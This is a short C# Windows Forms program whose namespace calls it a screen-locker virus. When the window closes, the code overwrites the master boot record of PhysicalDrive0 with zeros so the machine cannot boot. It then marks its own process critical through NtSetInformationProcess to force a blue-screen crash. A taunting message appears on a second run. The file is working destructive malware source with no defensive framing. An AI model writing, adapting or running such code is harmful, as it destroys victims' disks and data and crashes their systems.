using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace 锁机病毒
{
    public partial class Form1 : Form
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // 获取资源库设置好的 IsFirstRun 设置的值
            int runtimes = Properties.Settings.Default.times;
            if (runtimes == 2)
            {
                label5.Text = "第二次打开，好玩么？";
            }
            //MessageBox.Show("窗体加载完毕");
        }

        
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {

                //清空MBR让计算机无法开机
                // 读取 MBR
                byte[] mbr = new byte[512];
                using (FileStream stream = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open))
                {
                    stream.Read(mbr, 0, mbr.Length);
                }

                // 修改 MBR
                for (int i = 0; i < mbr.Length; i++)
                {
                    mbr[i] = 0x00;
                }

                // 写入 MBR
                using (FileStream stream = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open))
                {
                    stream.Write(mbr, 0, mbr.Length);
                }
            
            
            //关闭窗体触发蓝屏
            
            int isCritical = 1;  // we want this to be a Critical Process
            int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)

            Process.EnterDebugMode();  //acquire Debug Privileges

            // setting the BreakOnTermination = 1 for the current process
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            

        }

    }
}
